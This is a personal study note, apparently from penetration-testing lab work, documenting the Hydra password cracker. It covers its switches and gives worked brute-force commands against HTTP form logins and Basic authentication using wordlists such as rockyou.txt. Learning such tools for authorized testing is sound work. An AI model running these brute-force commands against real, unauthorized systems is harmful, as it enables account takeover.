---
creation date: November 14th 2022
last modified date: November 14th 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[Password Cracker]] - [[Dictionary Attack]] - [[Wordlist]] - [[Online Password Cracker]]
Search Tag: #🧰  

# [[Hydra]]  
___

## Description:
Fast logon cracker that supports multiple services.

## Installation
Pre-installed on Kali

## Commands

| Switch |                           Description                            |                   Example                   |
|:------:|:----------------------------------------------------------------:|:-------------------------------------------:|
|  `-t`  | Defines number of tasks that will run concurrently (default: 16) |               `hydra -t 100`                |
|  `-l`  |                    Defines a single username                     |            `hydra -l username`            |
|  `-L`  |                     Defines a username list                      |     `hydra -L /usr/share/wordlists/***`     |
|  `-p`  |                    Defines a single password                     |           `hydra -p password123`            |
|  `-P`  |                     Defines a password list                      | `hydra -P /usr/share/wordlists/rockyou.txt` |
|  `-s`  |                    Defines a port for service                    |               `hydra -s 5900`               |
|  `-m`  |           Allows adding sub-directory to a website URL           | `hydra 10.10.10.10 -m /protected`                                            |

### Syntax
```bash
hydra -l <USERNAME> -P <PATH TO LIST> <SERVICE>://<SERVER>
```
- Services:
	- These need to be lower case when entered
	- ssh
	- rdp
	- vnc
	- pop3
	- smtp(s)
	- http
	- http-get
	- http-post
	- ...

---
## Brute-Forcing HTTP Login
- Help menu command for syntax: `hydra http-get-form -U`
1. We need to gather what the **GET** / **POST** request looks like this can be done with Burp Suite or Developer Tools.
	- Below is showing us sending a failed request and we are looking for the **Request URL:** highlighted in the photo:
![[Pasted image 20230505170941.png]]
2. Now we can craft our attack command below is an example using the same **Request URL:** from the photo:
```bash
hydra -l burgess -P changed_clinic.lst 10.10.28.115 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:F=Login failed" -f
```
- Explanation of each switch:
	- `-l` = Defining single username can be changed with `-L` for a list
	- `-P` = Defining a password list can be changed with `-p` for a single password
	- `10.10.28.115` = IP address for fully qualified domain name (FDQN)
	- `http-get-form` = Defines the type of request we are making can be changed with `http-post-form` if that is what their requests use
	- Next is the info we gathered from the Request URL:
		- `login-get/index.php` = Path to the login page on the target webserver
		- `username=^USER^&password=^PASS^` = We changed out the test username/password for `^USER^` & `^PASS^` these are what **hydra** uses to inject parameters
		- `:S=logout.php` = This help limit the false positives by telling hydra to check the response for a value to determine if we actually got in. This can be changed with `:F=<WHATEVER_WE_BELIVE_SHOULD_SHOW>`.
			- `:S=<WHATEVER_WE_BELIVE_SHOULD_SHOW>` = We are saying if we see what we input then we got in
			- `:F=<WHATEVER_WE_BELIVE_SHOULD_SHOW>` = We are saying we failed to get in

## Brute-Forcing HTTP Basic Authentication
- When security has a simple popup menu on a webpage
```bash
hydra -L user.list -P password.list 10.10.10.10 -m <PATH_TO_DIRECTORY> http-get
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: November 14th 2022 (09:24 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
